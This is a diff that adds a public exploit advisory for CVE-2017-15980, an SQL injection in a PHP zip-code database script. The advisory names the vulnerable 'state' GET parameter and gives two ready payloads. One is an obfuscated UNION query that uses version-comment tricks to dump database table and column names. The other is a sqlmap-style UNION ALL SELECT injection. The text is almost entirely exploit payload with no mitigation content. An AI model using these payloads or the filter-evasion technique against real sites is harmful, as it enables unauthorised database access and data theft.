@@ -1,0 +1,32 @@
+# # # # # 
+# Exploit Title: US Zip Codes Database Script - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://rowindex.com/
+# Software Link: https://www.codester.com/items/4898/us-zip-codes-database-php-script
+# Demo: http://rowindex.com/demo/
+# Version: N/A
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15980
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/index.php?action=lookup-county&state=[SQL]
+# 
+# 11'+/*!08888UniOn*/+/*!08888Select*/+(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2))--+-
+# 
+# Parameter: state (GET)
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 1 column
+#     Payload: action=lookup-county&state=' UNION ALL SELECT CONCAT(0x716a717071,0x766a414e736e79524546725053474f72754d764a4772697a65666a7551464b46435141414d4e616c,0x7170707071)-- hvbM
+# 
+# Etc..
+# # # # #
